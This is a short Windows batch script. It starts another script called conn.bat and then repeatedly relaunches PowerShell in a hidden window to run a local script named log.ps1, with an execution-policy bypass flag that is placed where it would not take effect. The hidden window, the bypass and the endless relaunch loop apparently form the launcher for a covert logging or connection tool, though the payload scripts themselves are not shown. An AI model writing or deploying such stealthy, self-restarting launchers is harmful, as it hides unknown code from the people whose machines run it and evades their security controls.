@echo off
start conn.bat
 :loop
 PowerShell  -noexit -windowstyle hidden  -Command ".\log.ps1 -ep bypass"
 goto loop

